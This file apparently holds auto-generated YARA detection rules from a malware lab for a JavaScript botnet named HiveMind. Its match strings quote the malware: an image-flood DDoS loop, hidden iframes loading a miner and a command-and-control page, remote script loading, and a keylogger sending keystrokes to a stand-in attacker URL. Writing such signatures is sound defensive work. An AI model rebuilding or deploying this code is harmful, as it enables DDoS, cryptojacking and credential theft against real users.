/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/js_botnet_master_/js_botnet_master__auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-26
   Identifier: js_botnet_master_
   Reference: js_botnet_master_ auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_js_botnet_master__home_ubuntu_malware_lab_samples_extracted_javascript_JS_BotNet_master_node {
   meta:
      description = "js_botnet_master_ - file node.js"
      author = "Comps Team Malware Lab"
      reference = "js_botnet_master_ auto gen"
      date = "2026-02-26"
      hash1 = "5237406a0052e09cb6f9cc73a0b27561aa27a4394f4de74a2530262b1a5f4873"
   strings:
      $s1 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s2 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s3 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s4 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s7 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s8 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s9 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s10 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s11 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s12 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s13 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s14 = "document.write(\"<p>You currently running a Node in the HiveMind BotNet...</p>\");" fullword ascii /* score: '5.00'*/
      $s15 = "document.write(\"<p>Running...</p>\");" fullword ascii /* score: '5.00'*/
      $s16 = "document.write(\"<title>Running HiveMind Node...</title>\");" fullword ascii /* score: '5.00'*/
      $s17 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s18 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s19 = "},1000)" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x640a and filesize < 2KB and
      8 of them
}

rule _opt_mal_js_botnet_master__home_ubuntu_malware_lab_samples_extracted_javascript_JS_BotNet_master_bot {
   meta:
      description = "js_botnet_master_ - file bot.js"
      author = "Comps Team Malware Lab"
      reference = "js_botnet_master_ auto gen"
      date = "2026-02-26"
      hash1 = "cb7fc80e959ae279b8b48c7d92391dac0055b9b01f705e999393bb6bdfd52ea3"
   strings:
      $x1 = "var attacker = 'http://YourDomain.com/BotNet/CC/KeyLogger/?c='" fullword ascii /* score: '33.00'*/
      $s2 = "'http://TARGET-SITE.com/images/header.png');" fullword ascii /* score: '27.00'*/
      $s3 = "ddos('http://TARGET-SITE.com/images/header.png'," fullword ascii /* score: '27.00'*/
      $s4 = "  var TARGET = 'TARGET-SITE.com'" fullword ascii /* score: '24.00'*/
      $s5 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s6 = "document.write(\"<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>\");" fullword ascii /* score: '23.00'*/
      $s7 = "  pic.src = 'http://'+TARGET+URI+rand+'=val'" fullword ascii /* score: '20.00'*/
      $s8 = "$.getScript(url);" fullword ascii /* score: '15.00'*/
      $s9 = "$.getScript(url2);" fullword ascii /* score: '15.00'*/
      $s10 = "document.onkeypress = function(e) {" fullword ascii /* score: '10.00'*/
      $s11 = "function imgflood() {" fullword ascii /* score: '9.00'*/
      $s12 = "setInterval(imgflood, 10) //100 requests per second" fullword ascii /* score: '9.00'*/
      $s13 = "        new Image().src = attacker + data;" fullword ascii /* score: '9.00'*/
      $s14 = "  var rand = Math.floor(Math.random() * 1000)" fullword ascii /* score: '8.00'*/
      $s15 = "  var URI = '/index.php?'" fullword ascii /* score: '7.00'*/
      $s16 = "window.setInterval(function (){" fullword ascii /* score: '7.00'*/
      $s17 = "window.setInterval(function() {" fullword ascii /* score: '7.00'*/
      $s18 = "  var pic = new Image()" fullword ascii /* score: '4.00'*/
      $s19 = "function ddos(url,url2){" fullword ascii /* score: '4.00'*/
      $s20 = "var buffer = [];" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6f64 and filesize < 3KB and
      1 of ($x*) and 4 of them
}
